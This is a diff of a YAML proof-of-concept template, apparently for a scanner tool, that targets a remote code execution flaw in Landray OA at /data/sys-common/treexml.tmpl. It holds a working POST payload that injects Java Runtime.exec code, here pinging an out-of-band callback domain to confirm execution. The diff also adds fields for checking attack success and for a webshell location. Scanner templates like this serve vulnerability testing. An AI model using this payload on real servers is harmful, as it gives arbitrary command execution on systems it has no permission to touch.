@@ -2,17 +2,13 @@
 - name:
   - name: "LandrayOA_treexml_rce"
 
-#种类：poc对应的是scan.py
-- type:
-  - type: "poc"
-
 #请求方式
 - method:
   - method: "post"
 
 #payload
 - payload:
-  - s_bean: 'ruleFormulaValidate&script=try {String cmd = "ping cd1d5369.ipv6.1433.eu.org";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'
+  - payload: 's_bean=ruleFormulaValidate&script=try {String cmd = "ping cd1d5369.ipv6.1433.eu.org";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'
 
 #response包里的关键字
 - word:
@@ -22,3 +18,11 @@
 #漏洞的位置
 - url:
   - url : "/data/sys-common/treexml.tmpl"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
